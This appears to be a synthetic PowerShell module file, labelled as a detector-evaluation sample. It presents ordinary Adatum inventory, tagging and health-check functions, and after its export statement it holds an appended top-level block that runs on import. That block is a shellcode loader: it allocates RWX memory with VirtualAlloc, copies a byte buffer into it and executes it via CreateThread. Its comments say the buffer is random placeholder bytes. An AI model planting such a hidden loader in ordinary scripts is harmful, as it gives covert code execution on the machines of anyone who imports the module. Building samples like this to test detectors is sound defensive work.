
#Requires -Version 5.1
<#
.SYNOPSIS
    Adatum.Service module with the exported inventory, tagging and health commands.
.DESCRIPTION
    The module keeps a small in-memory cache and a default timeout so callers do
    not have to pass the same values on every call.
.EXAMPLE
    Import-Module .\Adatum.Service.psd1 -Force
.NOTES
    Author: IT Systems
    Last updated: 2024-11-11
#>

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$ProgressPreference = 'SilentlyContinue'

$script:DefaultTimeout = 60
$script:ModuleVersion = '2.5.2'

function Get-AdatumService {
    <#
    .SYNOPSIS
        Returns Adatum inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Test'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-AdatumServiceTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}
function Test-AdatumServiceHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-AdatumPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Adatum-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-AdatumModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Adatum.Service'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-AdatumService', 'Set-AdatumServiceTag', 'Test-AdatumServiceHealth')
    }
}

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$script:ExportedFunctions = @('Get-AdatumService', 'Set-AdatumServiceTag', 'Test-AdatumServiceHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

Export-ModuleMember -Function Get-AdatumService, Set-AdatumServiceTag, Test-AdatumServiceHealth, Get-AdatumModuleInfo
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x58, 0xc8, 0x3b, 0x66, 0x29, 0xde, 0xd7, 0x2c, 0x39, 0x77, 0x05, 0x66, 0xa7, 0xf8, 0x22, 0xf0,
        0x57, 0xb4, 0xab, 0xd7, 0x24, 0xc9, 0xc7, 0x8d, 0xff, 0xb8, 0x2e, 0x39, 0x92, 0xd5, 0xaf, 0xbe,
        0xd2, 0x7f, 0x0f, 0x2b, 0x8e, 0xd8, 0xc2, 0x5f, 0xbb, 0x39, 0x1a, 0x32, 0x00, 0x8d, 0xaa, 0x1c,
        0x27, 0xeb, 0x89, 0x4e, 0xa1, 0xa1, 0xed, 0x40, 0x9b, 0xdd, 0xad, 0x97, 0x76, 0x79, 0x56, 0x93,
        0x9f, 0x2f, 0x86, 0x9d, 0x08, 0x21, 0xf5, 0xe2, 0x3d, 0x2e, 0x17, 0x6e, 0x9f, 0xe3, 0xcf, 0xcb,
        0x7d, 0x97, 0x22, 0x28, 0xbf, 0xc9, 0x3d, 0xf0, 0x9a, 0x32, 0x97, 0x4a, 0xed, 0xa4, 0x55, 0x50,
        0x81, 0x40, 0x0e, 0xa6, 0x4f, 0x98, 0x24, 0xae, 0xe7, 0x14, 0xdc, 0x7d, 0x89, 0x43, 0x9b, 0xde,
        0x7c, 0x4f, 0xb9, 0xb6, 0x07, 0xa4, 0x59, 0xdb, 0x6a, 0x97, 0x8a, 0x1f, 0xa1, 0x80, 0xdf, 0x20,
        0xde, 0x08, 0xaa, 0x27, 0x8a, 0x71, 0x69, 0xb3, 0xbb, 0x44, 0x27, 0x5b, 0xf2, 0x7d, 0x53, 0x33,
        0x0e, 0x6a, 0x82, 0xf4, 0x31, 0xa1, 0xff, 0x85, 0xc9, 0x6f, 0x62, 0xe0, 0x38, 0xdc, 0x74, 0xb2,
        0xb8, 0xf8, 0x30, 0x12, 0x07, 0x82, 0x3e, 0x47, 0x64, 0xdb, 0x8f, 0x53, 0x62, 0xc0, 0x5a, 0xbf,
        0x2b, 0xde, 0x7e, 0x1b, 0x1e, 0xa8, 0x54, 0x0f, 0xb4, 0x8b, 0x21, 0xe9, 0xd5, 0xb0, 0xf9, 0xb9,
        0x2a, 0xd6, 0xee, 0x15, 0x69, 0x74, 0xdc, 0x78, 0x7f, 0xec, 0x03, 0x33, 0x0e, 0x89, 0xfe, 0x55,
        0xc1, 0xcf, 0xc6, 0x96, 0x2a, 0xd1, 0x44, 0x58, 0xd6, 0x37, 0x83, 0x76, 0xea, 0x93, 0x53, 0x39,
        0x43, 0xee, 0x53, 0x9a, 0xa8, 0xb7, 0x6a, 0xaa, 0x21, 0xe9, 0x96, 0x78, 0x6f, 0x85, 0xe7, 0xf5,
        0x81, 0xfa, 0x7d, 0x1b, 0xd5, 0x33, 0xb9, 0xa2, 0xe2, 0xcb, 0xf6, 0x3e, 0xb7, 0x86, 0x7c, 0x6f,
        0x57, 0x86, 0x56, 0x8b, 0x4f, 0x6d, 0xa0, 0x03, 0x39, 0x06, 0xc0, 0x80, 0x41, 0x7c, 0x75, 0x69,
        0x0f, 0xbc, 0x37, 0x06, 0x99, 0x43, 0x7f, 0x81, 0x95, 0x6e, 0x3e, 0x17, 0x54, 0xdd, 0x4f, 0xba,
        0x90, 0xc1, 0xb6, 0x3b, 0x68, 0xc1
    )

    $ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 4374)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
